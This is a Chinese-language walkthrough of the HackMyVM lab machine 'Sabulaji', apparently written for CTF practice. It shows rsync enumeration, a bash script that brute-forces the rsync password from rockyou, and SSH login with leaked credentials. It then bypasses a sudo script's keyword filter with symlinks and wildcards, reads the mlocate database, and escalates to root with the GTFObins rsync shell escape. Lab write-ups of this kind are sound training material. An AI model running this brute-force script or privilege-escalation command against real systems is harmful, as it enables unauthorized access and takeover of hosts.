
```shell
大佬WP：
https://www.bilibili.com/video/BV1sEMuz6EDh
http://162.14.82.114/index.php/859/06/12/2025/
```




### 1. 基本信息

```
靶机链接：
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=Sabulaji
```



```shell
难度：⭐️⭐️⭐️
知识点：信息收集，`rsync`文件同步，爆破`rsync`密码，软链接、通配符， `locate`数据库`mlocate.db `，`rsync`提权
```

### 2. 信息收集

### Nmap

```shell
└─# arp-scan -l | grep PCS
192.168.1.166   08:00:27:27:ab:ab       PCS Systemtechnik GmbH
└─# IP=192.168.1.166
└─# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-13 08:24 EDT
Nmap scan report for 192.168.1.166
Host is up (0.00087s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp  open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: epages
873/tcp open  rsync   (protocol version 31)
MAC Address: 08:00:27:27:AB:AB (Oracle VirtualBox virtual NIC)
```

开放了`22、80、873`端口，`873`端口有个` rsync `比较可疑

```shell
└─# nmap -sV --script "rsync-list-modules" -p 873 $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-13 10:32 EDT
Nmap scan report for 192.168.1.166
Host is up (0.00046s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|   
|   public              Public Files
|_  epages              Secret Documents
MAC Address: 08:00:27:27:AB:AB (Oracle VirtualBox virtual NIC)
```

### 目录扫描

```shell
└─# dirsearch -u http://$IP  -x 403 -e txt,php,html

└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP:3000 -x.txt,.php,.html

```

目录没啥有用信息，重点去`873`端口的` rsync `服务

### 3.获得`welcome`权限

##### `rsync` 远程文件同步

RSYNC（Remote Sync）是一个用于远程文件同步和备份的开源工具。

```shell
#常用的RSYNC参数的解释：
-a（归档模式）：该参数用于保持文件的所有属性，包括时间戳、权限、所有者等。它是一个常用的参数，用于在源和目标之间保持完全一致。
-v（详细模式）：该参数用于显示详细的输出信息，包括传输的文件列表、文件大小和传输速度等。
-r（递归模式）：该参数用于递归地同步目录和子目录，确保源和目标目录之间的所有文件都被同步。
-z（压缩模式）：该参数用于对传输的数据进行压缩，以减少传输的数据量。这在网络传输较慢的情况下可以提高传输速度。
-P（进度模式）：该参数用于显示传输的进度信息，包括已传输的文件数量和总体进度等。
-u（更新模式）：该参数用于仅同步源文件中新增或更新的文件，而不处理目标文件中已存在且没有变化的文件。
--delete（删除模式）：该参数用于在目标目录中删除与源目录中不同的文件。这对于保持目标目录与源目录完全一致很有用。
--exclude（排除模式）：该参数用于指定要排除的文件或目录，以避免将其同步到目标目录中。
--bwlimit=速度（带宽限制）：该参数用于限制传输速度，以防止RSYNC占用过多的带宽。
```

在使用rsync命令时，可以通过不同的路径来指定源文件/目录和目标文件/目录

```shell
#本地与远程之间的文件同步（使用SSH）：
rsync -e ssh /path/to/local/source user@remote:/path/to/destination
#同步文件夹：
rsync -av /path/to/source/ /path/to/destination/
#最常用的命令
rsync -avz -e 'ssh -p xxx' user@1.1.1.1:/data/test/  /data/test/
#如果端口和用户也是一致的话，是可以省略的
rsync -avz 1.1.1.1:/data/test/  /data/test/

```

在` public `中可以发现`todo.list `，先取下来

```shell
└─# rsync $IP::

public          Public Files
epages          Secret Documents
└─# rsync -av --list-only rsync://$IP/public

receiving incremental file list
drwxr-xr-x          4,096 2025/05/15 12:35:39 .
-rw-r--r--            433 2025/05/15 12:35:39 todo.list

sent 20 bytes  received 69 bytes  178.00 bytes/sec
total size is 433  speedup is 4.87
└─# rsync -av rsync://$IP:873/public/todo.list .       

receiving incremental file list
todo.list

sent 43 bytes  received 528 bytes  1,142.00 bytes/sec
total size is 433  speedup is 0.76
└─# ls -l todo.list                             
-rw-r--r-- 1 root sslh 433  5月15日 12:35 todo.list                                                                            
```

获得提示信息`todo.list`

```shell
└─# cat todo.list         
To-Do List
=========

1. sabulaji: Remove private sharing settings
   - Review all shared files and folders.
   - Disable any private sharing links or permissions.

2. sabulaji: Change to a strong password
   - Create a new password (minimum 12 characters, include uppercase, lowercase, numbers, and symbols).
   - Update the password in the system settings.
   - Ensure the new password is not reused from other accounts.
=========
```

访问`epages`需要密码，结合提示信息就是爆破`sabulaji`账户的密码

```shell
└─# rsync -av --list-only rsync://$IP/epages

Password: 
@ERROR: auth failed on module epages
rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver=3.3.0]
```

##### 爆破` rsync`密码

编写个` rsync`爆破脚本

```shell
└─# cat bp_rsync.sh
#!/bin/bash
for i in $(cat /usr/share/wordlists/rockyou.txt)
do
  echo "尝试密码:$i"
  RSYNC_PASSWORD="$i" rsync --list-only rsync://sabulaji@192.168.1.166:873/epages/ && echo "成功!密码:$i" && break
done

└─# ./bp_rsync.sh
```

获得密码 `admin123`，要跑很久，在`rockyou`的九万多行

```shell
@ERROR: auth failed on module epages
rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver=3.3.0]
尝试密码:admin123

drwxr-xr-x          4,096 2025/05/15 12:17:03 .
-rw-r--r--         13,312 2025/05/15 12:17:03 secrets.doc
成功!密码:admin123
```

获取 `secrets.doc`文档

```sh
└─# rsync -av --list-only rsync://sabulaji@$IP/epages/

Password: 
receiving incremental file list
drwxr-xr-x          4,096 2025/05/15 12:17:03 .
-rw-r--r--         13,312 2025/05/15 12:17:03 secrets.doc

sent 20 bytes  received 73 bytes  37.20 bytes/sec
total size is 13,312  speedup is 143.14
└─# rsync -av  rsync://sabulaji@$IP:873/epages/ ./

Password: 
receiving incremental file list
./
secrets.doc

sent 46 bytes  received 13,435 bytes  3,851.71 bytes/sec
total size is 13,312  speedup is 0.99
                                                                                                                                   
┌──(root㉿kali)-[/tmp]
└─# ls -l secrets.doc 
-rw-r--r-- 1 root root 13312  5月15日 12:17 secrets.doc
```

打开 `secrets.doc`文档

```shell
#secrets.doc
The Art of Keeping Secrets
In a world overflowing with information, keeping secrets is both an art and a challenge. Whether it's a personal diary tucked under a mattress or a cryptic message passed in a crowded café, the allure of hidden knowledge captivates us all.
Take, for example, the old server room in my office. It’s a dusty corner where forgotten machines hum quietly. One of them, a relic from the early 2000s, still runs an FTP service. The admin, in a moment of questionable judgment, named the default account "welcome." I overheard a colleague chuckle about it, saying the password was something absurdly simple, like "P@ssw0rd123!"—hardly a secret worth keeping, but it’s been untouched for years.
Secrets, however, aren’t just about passwords or hidden files. They’re about intent. A whispered rumor about a project, a coded glance between friends, or even the way we guard our thoughts. The best secrets are those that hide in plain sight, unnoticed by the distracted eye.
So, how do we master this art? First, blend in. Don’t make your secret obvious. Second, protect it with something stronger than "P@ssw0rd123!"—maybe a phrase only you’d understand. And finally, trust sparingly. Even the most welcoming systems can betray you if you’re not careful.
In the end, secrets remind us that not everything needs to be shared. Some things are better left unsaid, or at least, left to those who know where to look.

```

里面有一组账号密码信息：`welcome:P@ssw0rd123!` ，尝试进行登录是` ssh`的账号

```shell
└─# ssh welcome@$IP                                                                       
welcome@192.168.1.166's password: #P@ssw0rd123!
welcome@Sabulaji:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
```

##### 拿到`user.txt`

```shell
welcome@Sabulaji:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
welcome@Sabulaji:~$ cd
welcome@Sabulaji:~$ ls
user.txt
welcome@Sabulaji:~$ cat user.txt 

```



### 4.获得`sabulaji`权限

`sudo`发现 sabulaji 用户能够以 `sudo `身份运行 `/opt/sync.sh`

```shell
welcome@Sabulaji:/home$ sudo -l
Matching Defaults entries for welcome on Sabulaji:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Sabulaji:
    (sabulaji) NOPASSWD: /opt/sync.sh
    
welcome@Sabulaji:/home$ cat /opt/sync.sh
#!/bin/bash

if [ -z $1 ]; then
    echo "error: note missing"
    exit
fi

note=$1

if [[ "$note" == *"sabulaji"* ]]; then
    echo "error: forbidden"
    exit
fi

difference=$(diff /home/sabulaji/personal/notes.txt $note)

if [ -z "$difference" ]; then
    echo "no update"
    exit
fi

echo "Difference: $difference"

cp $note /home/sabulaji/personal/notes.txt

echo "[+] Updated."
```

​    脚本首先检查是否提供了参数，如果没有参数就报错退出。然后检查参数中是否包含`sabulaji`这个字符串，如果包含就拒绝执行。接着比较用户提供的文件与`/home/sabulaji/personal/notes.txt`的差异，如果没有差异就退出。如果有差异就显示差异内容，复制文件覆盖目标文件，最后提示更新成功。

```shell
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /etc/passwd
Difference: 1c1,27
< Maybe you can find it...
---
> root:x:0:0:root:/root:/bin/bash
> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
> bin:x:2:2:bin:/bin:/usr/sbin/nologin
> sys:x:3:3:sys:/dev:/usr/sbin/nologin
> sync:x:4:65534:sync:/bin:/bin/sync
> games:x:5:60:games:/usr/games:/usr/sbin/nologin
> man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
> lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
> mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
> news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
> uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
> proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
> www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
> backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
> list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
> irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
> gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
> _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
> systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
> systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
> systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
> systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
> messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
> sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
> welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
> sabulaji:x:1001:1001::/home/sabulaji:/bin/bash
[+] Updated.
welcome@Sabulaji:/tmp$ 
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /root/root.txt
diff: /root/root.txt: Permission denied
no update
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabulaji/personal/notes.txt
error: forbidden
```

##### `关键字过滤`

​		需实现的核心操作是不输入`sabulaji`关键字的请款下，读取`sabulaji`目录下的内容，可通过`软连接`、`通配符`等方式实现

```shell
welcome@Sabulaji:/tmp$ ln -sv /home/sabulaji/ /tmp/a
'/tmp/a' -> '/home/sabulaji/'
welcome@Sabulaji:/tmp$ ls -l /tmp/a
lrwxrwxrwx 1 welcome welcome 15 Jun 14 00:57 /tmp/a -> /home/sabulaji/
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabu*/personal/notes.txt
no update
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /tmp/a/personal/notes.txt
no update
```

接下来就是找看看`/home/sabulaji/`目录下藏了啥

#####  `locate`数据库`mlocate.db `

同时注意到`welcome`用户多了一个权限 `123(mlocate)`，翻一下这个属组相关的文件：

```shell
welcome@Sabulaji:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)

welcome@Sabulaji:/tmp$ find / -group mlocate 2>/dev/null
/usr/bin/mlocate
/etc/rsyncd.conf
/etc/rsyncd.secrets
/var/lib/mlocate/mlocate.db
/var/cache/locate/locatedb
/srv/rsync/public/todo.list
welcome@Sabulaji:/tmp$ ls -l /var/lib/mlocate/mlocate.db
-rw-r----- 1 root mlocate 1240438 Jun 14 00:22 /var/lib/mlocate/mlocate.db
```

​      在`var/lib/mlocate/`目录发现数据库文件 `mlocate.db`。`mlocate.db` 由 `updatedb` 命令生成，包含系统中所有文件的路径信息（如文件名、目录结构）。用户执行 `locate` 命令时，直接查询此数据库而非扫描磁盘，速度远超 `find` 等实时扫描工具

​	看一下`locate `命令，有` SGID` 权限
`SGID `作用：当普通用户执行 `locate`时，进程会临时以` mlocate` 组身份运行（而非用户原属组），从而只读访问数据库

```shell
welcome@Sabulaji:/tmp$ ls -l /usr/bin/locate
lrwxrwxrwx 1 root root 24 May 15 11:45 /usr/bin/locate -> /etc/alternatives/locate
ls -l /usr/bin/mlocate
welcome@Sabulaji:/tmp$ ls -l /usr/bin/mlocate
-rwxr-sr-x 1 root mlocate 43240 Dec  2  2020 /usr/bin/mlocate  # SGID 位（r-s 中的 's'）
权限继承：因 mlocate 组对数据库有读权限（r--），用户通过命令间接获得访问权。

```

尝试定位一下 `/opt/sync.sh`脚本的禁止字符相关的文件：

```shell
welcome@Sabulaji:/tmp$ locate *sabulaji*
/home/sabulaji
/home/sabulaji/.bash_history
/home/sabulaji/.bash_logout
/home/sabulaji/.bashrc
/home/sabulaji/.profile
/home/sabulaji/personal
welcome@Sabulaji:/tmp$ cat /var/lib/mlocate/mlocate.db | grep abulaji
Binary file (standard input) matches
welcome@Sabulaji:/tmp$ hexdump -C /var/lib/mlocate/mlocate.db | grep -i sabulaji
00008cb0  00 2f 68 6f 6d 65 2f 73  61 62 75 6c 61 6a 69 00  |./home/sabulaji.|
00008d10  2f 73 61 62 75 6c 61 6a  69 2f 70 65 72 73 6f 6e  |/sabulaji/person|
welcome@Sabulaji:/tmp$ strings /var/lib/mlocate/mlocate.db | grep -i sabulaji
sabulaji
/home/sabulaji
/home/sabulaji/personal
welcome@Sabulaji:/tmp$ xxd /var/lib/mlocate/mlocate.db | grep -i sabulaji -A 5
00008cb0: 002f 686f 6d65 2f73 6162 756c 616a 6900  ./home/sabulaji.
00008cc0: 002e 6261 7368 5f68 6973 746f 7279 0000  ..bash_history..
00008cd0: 2e62 6173 685f 6c6f 676f 7574 0000 2e62  .bash_logout...b
00008ce0: 6173 6872 6300 002e 7072 6f66 696c 6500  ashrc...profile.
00008cf0: 0170 6572 736f 6e61 6c00 0200 0000 0068  .personal......h
00008d00: 26ce 352d 89b7 0000 0000 002f 686f 6d65  &.5-......./home
00008d10: 2f73 6162 756c 616a 692f 7065 7273 6f6e  /sabulaji/person
00008d20: 616c 0000 6372 6564 732e 7478 7400 006e  al..creds.txt..n
00008d30: 6f74 6573 2e74 7874 0002 0000 0000 6826  otes.txt......h&
00008d40: cb6a 12d5 c700 0000 0000 2f68 6f6d 652f  .j......../home/
00008d50: 7765 6c63 6f6d 6500 002e 6261 7368 5f68  welcome...bash_h
00008d60: 6973 746f 7279 0000 2e62 6173 685f 6c6f  istory...bash_lo
```

目录`/home/sabulaji/personal`下发现 `creds.txt` 文件，读取内容（只显示差异，所以前后读不通文件）

```shell
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /tmp/a/personal/creds.txt
Difference: 0a1
> Sensitive Credentials:Z2FzcGFyaW4=
[+] Updated.
welcome@Sabulaji:/tmp$ echo "Z2FzcGFyaW4=" | base64 -d
gasparinwelcome@Sabulaji:/tmp$ 
#不用软连接也可以清空后用通配符
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /dev/null
Difference: 1d0
< Sensitive Credentials:Z2FzcGFyaW4=
[+] Updated.
welcome@Sabulaji:/tmp$ sudo -u sabulaji /opt/sync.sh /home/sabula*/personal/creds.txt
Difference: 0a1
> Sensitive Credentials:Z2FzcGFyaW4=
[+] Updated.
```

获得关键信息 `Z2FzcGFyaW4=`,别`base64`解码了，经测试这个就是`sabulaji`的密码

```shell
welcome@Sabulaji:/home$ su - sabulaji
Password: #Z2FzcGFyaW4=
sabulaji@Sabulaji:~$ ls
personal
sabulaji@Sabulaji:~$ id
uid=1001(sabulaji) gid=1001(sabulaji) groups=1001(sabulaji)
```

获得`sabulaji`的账号密码信息为`sabulaji:Z2FzcGFyaW4=`

### 5.获得root

`sudo`发现所有用户能够以 `root `身份运行 `/usr/bin/rsync`

```shell
sabulaji@Sabulaji:~$ sudo -l
Matching Defaults entries for sabulaji on Sabulaji:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sabulaji may run the following commands on Sabulaji:
    (ALL) NOPASSWD: /usr/bin/rsync
```

[[查阅](https://gtfobins.github.io/)](https://gtfobins.github.io/)` GTFObins`，有现成的 `rsync` 提权方案

```shell
#sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
sabulaji@Sabulaji:~$ sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
# id
uid=0(root) gid=0(root) groups=0(root)
```

##### 拿到`root.txt`

```shell
# id
uid=0(root) gid=0(root) groups=0(root)
# cd
# ls
root.txt
# cat root.txt

```